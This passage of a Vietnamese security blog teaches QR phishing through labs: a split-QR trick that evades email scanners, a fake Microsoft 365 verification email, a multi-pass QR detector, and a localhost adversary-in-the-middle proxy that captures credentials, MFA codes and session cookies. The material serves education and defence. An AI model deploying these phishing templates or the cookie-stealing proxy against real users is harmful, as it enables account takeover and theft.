# ── Tách làm 2 nửa ────────────────────────────────────────
print("\n[2] Tách làm 2 nửa (top / bottom)...")
w, h = full.size
mid = h // 2

top = full.crop((0, 0, w, mid))     # y: 0 → 150
bot = full.crop((0, mid, w, h))     # y: 150 → 300

top.save("output/lab2_top.png")
bot.save("output/lab2_bot.png")
print(f"  Top ({w}x{mid}) decode: {scan(top)}")
print(f"  Bot ({w}x{mid}) decode: {scan(bot)}")

# ── Tách làm 3 phần (kỹ thuật nâng cao hơn) ───────────────
print("\n[3] Thử tách 3 phần...")
t = h // 3
p1 = full.crop((0,   0, w, t))
p2 = full.crop((0,   t, w, t*2))
p3 = full.crop((0, t*2, w, h))

p1.save("output/lab2_p1.png")
p2.save("output/lab2_p2.png")
p3.save("output/lab2_p3.png")
print(f"  Part1 decode: {scan(p1)}")
print(f"  Part2 decode: {scan(p2)}")
print(f"  Part3 decode: {scan(p3)}")

# ── Thử tách theo chiều ngang (left / right) ──────────────
print("\n[4] Thử tách trái/phải...")
left  = full.crop((0, 0, w//2, h))
right = full.crop((w//2, 0, w, h))
left.save("output/lab2_left.png")
right.save("output/lab2_right.png")
print(f"  Left  decode: {scan(left)}")
print(f"  Right decode: {scan(right)}")

# ── Tạo email HTML demo ────────────────────────────────────
print("\n[5] Tạo phishing email HTML demo...")
html = f"""<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="font-family: Segoe UI, sans-serif;
             max-width: 500px; margin: 50px auto; padding: 20px;">

  <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"
       width="100" style="margin-bottom: 20px;"><br>

  <h2 style="color: #333;">Action Required: Verify Your Account</h2>

  <p>Your Microsoft 365 account requires immediate verification.
     Scan the QR code below with your mobile device.</p>

  <p><strong style="color: #d83b01;">
    ⚠ This verification link expires in 24 hours.
  </strong></p>

  <!--
    KỸ THUẬT SPLIT QR (Gabagool PhaaS):
    - Scanner email thấy: 2 ảnh PNG riêng lẻ → không decode được → SAFE
    - Người dùng thấy: 1 QR code hoàn chỉnh (2 ảnh ghép liền nhau)
  -->
  <div style="display: inline-block; border: 1px solid #eee; padding: 0;">
    <img src="lab2_top.png"
         width="200"
         style="display: block; margin: 0; border: 0; padding: 0;">
    <img src="lab2_bot.png"
         width="200"
         style="display: block; margin: 0; border: 0; padding: 0;">
  </div>

  <p style="color: #888; font-size: 12px; margin-top: 30px;">
    Microsoft Corporation, One Microsoft Way, Redmond, WA 98052
  </p>
</body>
</html>"""

with open("output/lab2_email_demo.html", "w") as f:
    f.write(html)

# ── Kết luận ──────────────────────────────────────────────
print("\n" + "─" * 55)
print("KẾT LUẬN:")
print("─" * 55)
top_bypass = scan(top) is None
bot_bypass = scan(bot) is None
full_ok    = scan(full) is not None

print(f"  Top bypass scanner  : {'✅' if top_bypass else '❌'}")
print(f"  Bot bypass scanner  : {'✅' if bot_bypass else '❌'}")
print(f"  Full QR detectable  : {'✅' if full_ok else '❌'}")

if top_bypass and bot_bypass:
    print("\n🔴 SPLIT QR CONFIRMED WORKING")
    print("   Mở output/lab2_email_demo.html trong browser")
    print("   để thấy QR hoàn chỉnh như người dùng thấy")
```

**Chạy lab:**

```bash
python3 lab2.py

# Mở email demo để quan sát
firefox output/lab2_email_demo.html
# hoặc
xdg-open output/lab2_email_demo.html   # Linux
open output/lab2_email_demo.html       # macOS
```

**Output mong đợi:**

```
KẾT LUẬN:
───────────────────────────────────────────────────────
  Top bypass scanner  : ✅
  Bot bypass scanner  : ✅
  Full QR detectable  : ✅

🔴 SPLIT QR CONFIRMED WORKING
```

> 📝 **Điều cần ghi nhận:** Mở `lab2_email_demo.html` trong browser — bạn thấy QR trông hoàn chỉnh, có thể quét bình thường. Nhưng trong source HTML, đó là 2 thẻ `<img>` riêng biệt. Thử tách trái/phải (Lab 2 bước 4) — thường **không hiệu quả** vì finder pattern ở 3 góc, khi tách dọc ít nhất 2 trong 3 finder pattern vẫn nằm trong một nửa, scanner vẫn có thể decode một nửa.

---

### Lab 3: Multi-pass QR Analyzer — Detection Tool

**Mục tiêu:** Xây dựng tool phát hiện nested/split QR bằng quadrant scanning — vượt qua được hạn chế của scanner thông thường.

**Tạo file:**

```bash
nano ~/qr-lab/lab3.py
```

**Nội dung script:**

```python
from PIL import Image
from pyzbar.pyzbar import decode
from urllib.parse import urlparse
import sys, json, os

# ── Danh sách phân tích URL ───────────────────────────────
SUSPICIOUS_KW  = ["login","verify","secure","reset","auth",
                  "password","account","update","confirm"]
SHORTENERS     = ["bit.ly","tinyurl","t.co","rb.gy",
                  "qr.io","short.io","ow.ly"]
SAFE_DOMAINS   = ["google.com","microsoft.com","apple.com",
                  "github.com","amazon.com","linkedin.com"]
# ─────────────────────────────────────────────────────────

def scan_image(img):
    """Decode tất cả QR từ PIL Image"""
    return [r.data.decode("utf-8", errors="replace")
            for r in decode(img)]

def analyze_url(url):
    """Trả về (risk_score, list issues) cho một URL"""
    issues = []
    risk   = 0
    try:
        p      = urlparse(url)
        domain = p.netloc.lower().replace("www.", "")
        path   = p.path.lower()

        # Check allowlist
        is_safe = any(
            domain == d or domain.endswith("." + d)
            for d in SAFE_DOMAINS
        )
        if is_safe:
            return 0, []

        # URL shortener
        if any(s in domain for s in SHORTENERS):
            issues.append(f"URL shortener detected: {domain}")
            risk += 20

        # Suspicious keywords
        combined = domain + path
        kws = [k for k in SUSPICIOUS_KW if k in combined]
        if kws:
            issues.append(f"Suspicious keywords: {', '.join(kws)}")
            risk += 15

        # IP address instead of domain
        import re
        if re.match(r"^\d{1,3}(\.\d{1,3}){3}", domain):
            issues.append(f"IP address as domain: {domain}")
            risk += 25

        # HTTP (not HTTPS)
        if p.scheme == "http":
            issues.append("Unencrypted HTTP")
            risk += 10

        # Non-standard TLD
        suspicious_tlds = [".xyz", ".top", ".click",
                           ".tk", ".ml", ".ga", ".cf", ".lab"]
        for tld in suspicious_tlds:
            if domain.endswith(tld):
                issues.append(f"Suspicious TLD: {tld}")
                risk += 15
                break

    except Exception as e:
        issues.append(f"Parse error: {e}")
        risk += 5

    return risk, issues


def analyze_file(path):
    """
    Multi-pass QR analysis:
    Pass 1: Full image scan
    Pass 2: 5 quadrant scans
    Compare → detect nested/split
    """
    print(f"\n{'='*55}")
    print(f"QR SECURITY ANALYZER")
    print(f"File : {path}")

    img = Image.open(path).convert("RGB")
    w, h = img.size
    print(f"Size : {w}x{h}px")
    print(f"{'='*55}")

    # ── Pass 1: Full image ─────────────────────────────
    print("\n[Pass 1] Full image scan...")
    full_urls = scan_image(img)
    for url in full_urls:
        print(f"  Found: {url}")
    if not full_urls:
        print("  → No QR found in full image")

    # ── Pass 2: Quadrant scans ─────────────────────────
    print("\n[Pass 2] Quadrant scans...")
    regions = {
        "top_left":    (0,   0,   w//2, h//2),
        "top_right":   (w//2,0,   w,    h//2),
        "bot_left":    (0,   h//2,w//2, h),
        "bot_right":   (w//2,h//2,w,    h),
        "center":      (w//4,h//4,3*w//4,3*h//4),
    }

    all_found  = {url: "full_scan" for url in full_urls}
    new_found  = []

    for name, box in regions.items():
        crop    = img.crop(box)
        results = scan_image(crop)
        for url in results:
            if url not in all_found:
                all_found[url] = name
                new_found.append((url, name))
                print(f"  [{name}] ⚠️  NEW URL: {url}")
            else:
                print(f"  [{name}] same as full scan: {url[:40]}...")

    # ── Detect nested structure ────────────────────────
    is_nested = bool(new_found)
    if is_nested:
        print(f"\n  🔴 NESTED/SPLIT QR DETECTED!")
        print(f"     Quadrant found URLs not in full-image scan")

    # ── URL Risk Analysis ──────────────────────────────
    print("\n[Analysis] URL risk assessment...")
    total_risk = 0
    all_issues = []

    if is_nested:
        total_risk += 40
        all_issues.append("NESTED QR — possible QR-in-QR attack (HIGH CONFIDENCE)")

    for url in all_found:
        r, issues = analyze_url(url)
        total_risk += r
        all_issues.extend(issues)
        if issues:
            print(f"  URL: {url[:50]}")
            for i in issues:
                print(f"       → {i}")

    # ── Risk Level ────────────────────────────────────
    total_risk = min(total_risk, 100)
    level = (
        "CRITICAL" if total_risk >= 40 else
        "HIGH"     if total_risk >= 25 else
        "MEDIUM"   if total_risk >= 15 else
        "LOW"      if total_risk >= 5  else
        "SAFE"
    )
    color = {
        "CRITICAL": "🔴", "HIGH": "🟠",
        "MEDIUM": "🟡", "LOW": "🟢", "SAFE": "✅"
    }[level]

    print(f"\n{'─'*55}")
    print(f"  Total QR found : {len(all_found)}")
    print(f"  Nested QR      : {'YES ← suspicious' if is_nested else 'No'}")
    print(f"  Risk score     : {total_risk}/100")
    print(f"  Risk level     : {color} {level}")
    if all_issues:
        print(f"\n  Findings:")
        for i in all_issues:
            print(f"    • {i}")
    print(f"{'─'*55}")

    return {
        "file": path,
        "nested": is_nested,
        "risk_score": total_risk,
        "risk_level": level,
        "issues": all_issues,
        "all_urls": list(all_found.keys())
    }


# ── Chạy trên output từ Lab 1 & 2 ────────────────────────
if __name__ == "__main__":
    targets = [
        "output/lab1_single.png",    # Kỳ vọng: SAFE (URL xấu nhưng không nested)
        "output/lab1_nested.png",    # Kỳ vọng: CRITICAL (nested detected)
        "output/lab2_full.png",      # Kỳ vọng: HIGH (URL xấu)
        "output/lab2_top.png",       # Kỳ vọng: SAFE (không decode được)
    ]

    # Thêm file từ command line nếu có
    if len(sys.argv) > 1:
        targets = sys.argv[1:]

    results = []
    for t in targets:
        if os.path.exists(t):
            r = analyze_file(t)
            results.append(r)
        else:
            print(f"\n[skip] {t} not found — chạy Lab 1 & 2 trước")

    # Lưu report tổng hợp
    with open("output/lab3_report.json", "w") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    print(f"\n✅ Report: output/lab3_report.json")
```

**Chạy lab:**

```bash
python3 lab3.py

# Analyze file bất kỳ
python3 lab3.py output/lab1_nested.png
```

**Output mong đợi (trên lab1_nested.png):**

```
[Pass 1] Full image scan...
  Found: https://google.com

[Pass 2] Quadrant scans...
  [top_left]  same as full scan: https://google.com
  [top_right] same as full scan: https://google.com
  [bot_left]  same as full scan: https://google.com
  [bot_right] same as full scan: https://google.com
  [center]    ⚠️  NEW URL: https://evil.attacker.lab/steal-creds

  🔴 NESTED/SPLIT QR DETECTED!

───────────────────────────────────────────────────────
  Nested QR      : YES ← suspicious
  Risk score     : 75/100
  Risk level     : 🔴 CRITICAL
  Findings:
    • NESTED QR — possible QR-in-QR attack (HIGH CONFIDENCE)
    • Suspicious TLD: .lab
```

> 📝 **Điều cần ghi nhận:** Center quadrant scan là chìa khóa. Inner QR thường được đặt ở trung tâm outer QR. Center crop (25%–75% cả hai chiều) phủ đúng vùng inner QR → có thể decode riêng nó. Khi so sánh với full-image scan (trả về inner = google.com), center scan trả về outer URL khác → phát hiện nested.

---

### Lab 4: AiTM Proxy Concept — Tại sao MFA không đủ

**Mục tiêu:** Minh họa cơ chế session cookie theft và tại sao MFA bị bypass hoàn toàn bởi AiTM.

> 🔒 **Bắt buộc:** Chạy trong môi trường isolated. KHÔNG expose ra internet hay mạng nội bộ công ty.

**Cài thêm dependency:**

```bash
pip install flask requests
```

**Tạo file:**

```bash
nano ~/qr-lab/lab4.py
```

**Nội dung script:**

```python
"""
Lab 4: AiTM Proxy Concept — Educational Demonstration
Mục đích: Hiểu TẠI SAO MFA không bảo vệ trước session cookie theft
Môi trường: localhost only, isolated
"""
from flask import Flask, request, redirect, session, jsonify, Response
import requests as req_lib
import threading, json
from datetime import datetime

PROXY_PORT   = 5001   # "Attacker" proxy — victim connects here
AUTH_PORT    = 5002   # "Real" auth server — proxy forwards here

CAPTURED     = []     # Stolen credentials + MFA codes
COOKIES      = []     # Stolen session cookies

# ══ SERVER A: Fake "Legitimate" Auth (simulates Microsoft) ════
auth = Flask("auth")
auth.secret_key = "lab-key-auth"

@auth.route("/login", methods=["GET", "POST"])
def auth_login():
    if request.method == "GET":
        return """<!DOCTYPE html>
<html><body style="font-family:sans-serif;max-width:380px;margin:80px auto">
<h2>Microsoft Sign In <small style="color:red">[LAB FAKE]</small></h2>
<form method="POST">
  <input name="email" placeholder="Email" required
         style="width:100%;padding:8px;margin:5px 0;display:block"><br>
  <input name="password" type="password" placeholder="Password" required
         style="width:100%;padding:8px;margin:5px 0;display:block"><br>
  <button style="background:#0078d4;color:#fff;padding:10px 20px;border:none;cursor:pointer">
    Sign in
  </button>
</form></body></html>"""

    email    = request.form.get("email", "")
    password = request.form.get("password", "")
    # Simulate: show MFA challenge
    return f"""<!DOCTYPE html>
<html><body style="font-family:sans-serif;max-width:380px;margin:80px auto">
<h2>Enter code</h2>
<p>We sent a 6-digit code to: {email}</p>
<form method="POST" action="/verify">
  <input name="email"    type="hidden" value="{email}">
  <input name="password" type="hidden" value="{password}">
  <input name="mfa_code" placeholder="6-digit code" required
         style="width:100%;padding:8px;display:block;margin:5px 0"><br>
  <button style="background:#0078d4;color:#fff;padding:10px 20px;border:none;cursor:pointer">
    Verify
  </button>
</form></body></html>"""

@auth.route("/verify", methods=["POST"])
def auth_verify():
    email    = request.form.get("email", "")
    # In real AiTM: relay to actual Microsoft, get real session
    session["authenticated"] = True
    session["email"]         = email
    session["created_at"]    = datetime.now().isoformat()
    return f"""<!DOCTYPE html>
<html><body style="font-family:sans-serif;max-width:380px;margin:80px auto">
<div style="background:#d4edda;padding:20px;border-radius:5px">
  <h2>✅ Signed in</h2>
  <p>Welcome, {email}</p>
  <p style="font-size:12px;color:#666">Session established.</p>
</div></body></html>"""

@auth.route("/session")
def auth_session():
    return jsonify(dict(session))

# ══ SERVER B: AiTM Proxy ══════════════════════════════════════
proxy = Flask("proxy")
proxy.secret_key = "lab-key-proxy"

@proxy.route("/", defaults={"path": ""})
@proxy.route("/<path:path>", methods=["GET","POST"])
def intercept(path):
    """Proxy intercepts EVERYTHING between victim and auth server"""
    target = f"http://localhost:{AUTH_PORT}/{path}"

    # ── Capture POST data (credentials + MFA) ─────────────
    if request.method == "POST" and request.form:
        entry = {
            "timestamp":  datetime.now().isoformat(),
            "path":       f"/{path}",
            "form_data":  dict(request.form),
            "user_agent": request.headers.get("User-Agent","")
        }
        CAPTURED.append(entry)

        # Print to console (simulates attacker's real-time view)
        print(f"\n{'!'*50}")
        print(f"[AiTM] 🔴 INTERCEPTED at {entry['timestamp']}")
        print(f"[AiTM] Path: {entry['path']}")
        for k, v in entry["form_data"].items():
            # Mask password display but still store it
            display = "*" * len(v) if k == "password" else v
            print(f"[AiTM] {k}: {display}")
        print(f"{'!'*50}")

    # ── Forward to real auth server ────────────────────────
    try:
        resp = req_lib.request(
            method  = request.method,
            url     = target,
            data    = request.form,
            headers = {k: v for k, v in request.headers
                       if k.lower() not in
                          ("host","content-length","transfer-encoding")},
            allow_redirects = False,
            timeout = 5
        )

        # ── Capture session cookies from response ──────────
        if resp.cookies:
            stolen = {
                "timestamp": datetime.now().isoformat(),
                "from_path": f"/{path}",
                "cookies":   dict(resp.cookies)
            }
            COOKIES.append(stolen)
            print(f"\n[AiTM] 🍪 SESSION COOKIE STOLEN")
            print(f"[AiTM] Path : /{path}")
            print(f"[AiTM] Cookies: {dict(resp.cookies)}")

        return Response(
            response = resp.content,
            status   = resp.status_code,
            headers  = {k: v for k, v in resp.headers.items()
                        if k.lower() not in
                           ("transfer-encoding","content-encoding")}
        )
    except Exception as e:
        return f"<h2 style='color:red'>Lab Error: {e}</h2><p>Is auth server running?</p>", 500

@proxy.route("/lab/captured")
def show_captured():
    """Endpoint để xem tất cả dữ liệu đã steal"""
    return jsonify({
        "credentials_captured": len(CAPTURED),
        "cookies_captured":     len(COOKIES),
        "credentials":          CAPTURED,
        "session_cookies":      COOKIES,
        "key_insight": (
            "Session cookie = vào tài khoản KHÔNG cần password/MFA. "
            "Attacker dùng cookie này để đăng nhập trực tiếp."
        )
    })

# ══ MAIN ══════════════════════════════════════════════════════
if __name__ == "__main__":
    print("=" * 60)
    print("LAB 4: AiTM Proxy Concept Server")
    print("=" * 60)
    print(f"\n⚠️  EDUCATIONAL PURPOSE ONLY — LOCALHOST ONLY")
    print(f"\nServers:")
    print(f"  Auth server  : http://localhost:{AUTH_PORT}/login")
    print(f"  AiTM proxy   : http://localhost:{PROXY_PORT}/login  ← dùng cái này")
    print(f"\nCapture endpoint:")
    print(f"  http://localhost:{PROXY_PORT}/lab/captured")
    print(f"\nInstructions:")
    print(f"  1. Mở browser → http://localhost:{PROXY_PORT}/login")
    print(f"  2. Nhập email/password bất kỳ → Next")
    print(f"  3. Nhập MFA code bất kỳ → Verify")
    print(f"  4. Xem dữ liệu bị steal:")
    print(f"     curl http://localhost:{PROXY_PORT}/lab/captured")
    print(f"  5. Quan sát: attacker có CẢ credentials VÀ session cookie")
    print(f"     → vào được tài khoản mà không cần password hay MFA\n")

    # Start auth server in background thread
    auth_thread = threading.Thread(
        target=lambda: auth.run(port=AUTH_PORT, debug=False,
                                use_reloader=False)
    )
    auth_thread.daemon = True
    auth_thread.start()
    print(f"[✓] Auth server started on port {AUTH_PORT}")

    # Start proxy in main thread
    proxy.run(port=PROXY_PORT, debug=False)
```

**Chạy lab:**

```bash
# Terminal 1: chạy servers
python3 lab4.py

# Terminal 2: thực hiện "attack" simulation
# Bước 1: vào proxy (không phải trực tiếp auth server)
# Mở browser → http://localhost:5001/login
# Nhập email + password giả → Next → nhập MFA code giả → Verify

# Bước 2: xem dữ liệu bị steal
curl http://localhost:5001/lab/captured | python3 -m json.tool
```

**Output mong đợi:**

```json
{
  "credentials_captured": 1,
  "cookies_captured": 1,
  "credentials": [
    {
      "timestamp": "2025-11-15T14:32:07",
      "path": "/verify",
      "form_data": {
        "email": "victim@company.com",
        "mfa_code": "847291"
      }
    }
  ],
  "session_cookies": [
    {
      "timestamp": "2025-11-15T14:32:08",
      "cookies": { "session": "eyJh...STOLEN" }
    }
  ],
  "key_insight": "Session cookie = vào tài khoản KHÔNG cần password/MFA."
}
```

> 📝 **Điều cần ghi nhận:** Attacker có **cả ba thứ**: email, password, MFA code — và quan trọng hơn là session cookie. Cookie này có thể dùng để đăng nhập Microsoft 365 trực tiếp mà không cần biết password hay có thiết bị MFA. Đây là lý do tại sao MFA truyền thống (TOTP/SMS) không bảo vệ được trước AiTM. **Giải pháp thực sự:** FIDO2/Passkeys — bound với origin domain, không thể relay sang domain giả mạo.

---

### Tổng kết 4 bài Lab

| Lab | Kỹ thuật mô phỏng | Kết quả thực nghiệm | Kết luận |
|-----|-------------------|---------------------|---------|
| **Lab 1** | Nested QR-in-QR | `pyzbar` decode `google.com`, bỏ qua URL độc hại | FALSE NEGATIVE confirmed |
| **Lab 2** | Split QR (Gabagool) | Mỗi nửa → `None`; email demo trông hoàn chỉnh | Scanner bypass hoàn toàn |
| **Lab 3** | Multi-pass Detection | Center quadrant tìm ra outer QR ẩn | CRITICAL alert triggered |
| **Lab 4** | AiTM Proxy (Tycoon 2FA) | Session cookie capture sau MFA | MFA bypassed hoàn toàn |

---

## 10. Chiến lược phòng thủ

### 10.1 Giải pháp kỹ thuật

**Multimodal AI + Multi-pass QR Scanning**
Kết hợp OCR, deep image processing, NLP. Scan toàn ảnh + 5 quadrant để phát hiện nested/split QR. Execute URL trong sandbox với real browser engine (Chromium headless) để bypass Cloudflare Turnstile. Barracuda Networks xác nhận multimodal AI là approach hiệu quả nhất hiện tại.

**Mobile Device Management (MDM) + Zero Trust**
Áp dụng Zero Trust cho thiết bị cá nhân. URL filtering trên mobile kiểm tra trước khi mở browser, bất kể URL đến từ QR, SMS, hay email.

**FIDO2 / Passkeys — giải pháp kỹ thuật mạnh nhất**
FIDO2 hardware keys (YubiKey...) và passkeys **bound với origin domain** — không thể relay qua AiTM proxy. Kể cả khi nạn nhân vào trang phishing hoàn hảo, token vô dụng vì origin domain không khớp. Lab 4 chứng minh rõ tại sao TOTP/SMS MFA không đủ — đây là lý do FIDO2 là upgrade bắt buộc.

### 10.2 Giải pháp con người và quy trình

**Đào tạo nhận thức QR-specific**
Đào tạo tập trung vào QR phishing cải thiện tỷ lệ phát hiện lên **87% trong 3 tháng** (Keepnet Labs, 2025). Nội dung cốt lõi: không quét QR từ email chưa xác minh, nhận biết urgency tactic, báo cáo ngay khi nghi ngờ.

**Chính sách "Không quét QR từ email"**
Bất kỳ QR nào nhận qua email phải xác minh qua kênh liên lạc riêng (điện thoại, Slack nội bộ) trước khi quét. Không có ngoại lệ — kể cả email trông như từ Microsoft hay DocuSign.

### 10.3 Detection Indicators (IoC)

```
Email Header:
□ From domain khác với Reply-To
□ SPF/DKIM/DMARC fail hoặc vắng mặt
□ Sending IP không match domain history

Email Body:
□ Không có text link — chỉ có QR (ít signal cho ML)
□ QR chiếm phần lớn email / attachment
□ Urgency language ("expires in 24h", "mandatory", "immediate action")
□ Thương hiệu lớn + QR = red flag combo

QR Content (nếu decode được):
□ URL shortener
□ IP thay domain
□ Suspicious keywords (login, verify, reset, secure)
□ Multiple QR trong cùng email/PDF
□ QR image kích thước bất thường
```

---

## 11. Kết luận và xu hướng 2026

### Ý nghĩa chiến lược

QR-in-QR đánh dấu một bước ngoặt: kẻ tấn công không chỉ giấu payload độc hại mà còn **chủ động dùng nội dung hợp lệ làm lá chắn** cho mối đe dọa thực. Đây là logic đảo ngược hoàn toàn giả định bảo mật truyền thống — scanner không thể tin vào kết quả decode của chính nó nữa.

Với thương mại hóa qua PhaaS ($100/tháng), kỹ thuật từng chỉ thuộc tầm với APT groups nay phổ cập cho bất kỳ kẻ tấn công nào.

### Sự kiện Tycoon 2FA (3/2026)

Liên minh quốc tế triệt phá Tycoon 2FA là chiến thắng đáng kể. Nhưng lịch sử an ninh mạng cho thấy: mỗi khi một PhaaS bị hạ, platform thay thế xuất hiện trong vài tuần với kỹ thuật cải tiến hơn.

### Xu hướng dự báo 2026–2027

**AI-generated Quishing:** AI tự động hóa tạo nested QR cá nhân hóa theo OSINT (LinkedIn profile, công ty, chức vụ). Email phishing không còn generic mà hyper-personalized.

**Quishing + Deepfake:** Video deepfake CEO/quản lý yêu cầu nhân viên quét QR "khẩn cấp". Kết hợp social engineering mạnh nhất với kỹ thuật bypass tinh vi nhất.

**QR trong physical world:** Mã QR dán đè lên QR hợp lệ tại nhà hàng, ATM, trạm xe bus — attack surface mở rộng ra ngoài email.

**Mobile-first targeting:** Tấn công chuyển hướng sang mobile ecosystem — deep links vào banking apps, crypto wallets, ứng dụng nhắn tin.

---

## 12. Tài liệu tham khảo

| # | Tiêu đề | Tổ chức | Năm | URL |
|---|---------|---------|-----|-----|
| [1] | Threat Spotlight: Split and nested QR codes fuel new generation of quishing attacks | Barracuda Networks | Aug 2025 | https://blog.barracuda.com/2025/08/20/threat-spotlight-split-nested-qr-codes-quishing-attacks |
| [2] | Evolution of Sophisticated Phishing Tactics: The QR Code Phenomenon | Palo Alto Networks Unit 42 | Apr 2025 | https://unit42.paloaltonetworks.com/qr-code-phishing/ |
| [3] | Phishing on the Edge of the Web and Mobile Using QR Codes | Palo Alto Networks Unit 42 | Feb 2026 | https://unit42.paloaltonetworks.com/qr-codes-as-attack-vector/ |
| [4] | QR Code Phishing Statistics & Quishing Trends In-Depth Analysis | Keepnet Labs | 2025 | https://keepnetlabs.com/blog/qr-code-phishing-trends-in-depth-analysis-of-rising-quishing-statistics |
| [5] | Disruption targets Tycoon 2FA, popular AiTM PhaaS | Proofpoint | Mar 2026 | https://www.proofpoint.com/us/blog/threat-insight/disruption-targets-tycoon-2fa-popular-aitm-phaas |
| [6] | Tycoon 2FA: An in-depth analysis of the latest version of the AiTM phishing kit | Sekoia TDR | Mar 2024 | https://blog.sekoia.io/tycoon-2fa-an-in-depth-analysis-of-the-latest-version-of-the-aitm-phishing-kit/ |
| [7] | Security Challenges Rise as QR Code and AI-Generated Phishing Proliferate | Recorded Future / Insikt Group | 2024 | https://www.recordedfuture.com/research/qr-code-and-ai-generated-phishing-proliferate |
| [8] | The Evolution of Quishing: How QR Code Phishing Bypasses Modern Security | Open Systems | Sep 2025 | https://www.open-systems.com/blog/evolution-of-quishing/ |
| [9] | Threat Spotlight: The evolving use of QR codes in phishing attacks | Barracuda Networks | Oct 2024 | https://blog.barracuda.com/2024/10/22/threat-spotlight-evolving-qr-codes-phishing-attacks |
| [10] | Tycoon 2FA: A Technical Analysis of its Adversary-in-the-Middle Phishing Operation | CYFIRMA | Nov 2025 | https://www.cyfirma.com/research/tycoon-2fa-a-technical-analysis-of-its-adversary-in-the-middle-phishing-operation/ |
| [11] | Understanding QR code phishing attacks | Paubox | Feb 2026 | https://www.paubox.com/blog/understanding-qr-code-phishing-attacks |
| [12] | Adversary-in-the-Middle Phishing: How AiTM Bypasses MFA | MyCloudStar | Apr 2026 | https://mycloudstar.com/adversary-in-the-middle-phishing-how-attackers-are-hijacking-mfa-protected-sessions/ |

### Thư viện sử dụng trong Lab

| Thư viện | Phiên bản | Mục đích |
|----------|-----------|----------|
| `qrcode` | 7.4+ | Tạo QR code |
| `Pillow (PIL)` | 10.0+ | Image processing |
| `pyzbar` | 0.1.9+ | QR/Barcode decoder |
| `Flask` | 3.0+ | Web server cho AiTM lab |

### Thuật ngữ

| Thuật ngữ | Định nghĩa |
|-----------|-----------|
| **Quishing** | QR + Phishing — tấn công phishing dùng QR code độc hại |
| **AiTM** | Adversary-in-the-Middle — kẻ tấn công đứng giữa nạn nhân và server thật |
| **PhaaS** | Phishing-as-a-Service — nền tảng cho thuê công cụ phishing |
| **Nested QR / QR-in-QR** | QR độc hại nhúng bên trong/xung quanh QR hợp lệ |
| **Split QR** | QR tách thành 2+ ảnh riêng để bypass scanner |
| **Session Cookie Theft** | Đánh cắp cookie xác thực để chiếm tài khoản không cần mật khẩu |
| **False Negative** | Scanner báo "safe" nhưng thực tế nội dung độc hại |
| **FIDO2 / Passkeys** | Tiêu chuẩn xác thực bound với origin domain, không thể relay qua AiTM |
| **ECC Level H** | Error Correction High — QR chịu được che khuất 30% và vẫn decode được |

---

*Blog này được viết cho mục đích nghiên cứu bảo mật và giáo dục. Các lab script chỉ sử dụng trong môi trường kiểm soát.*

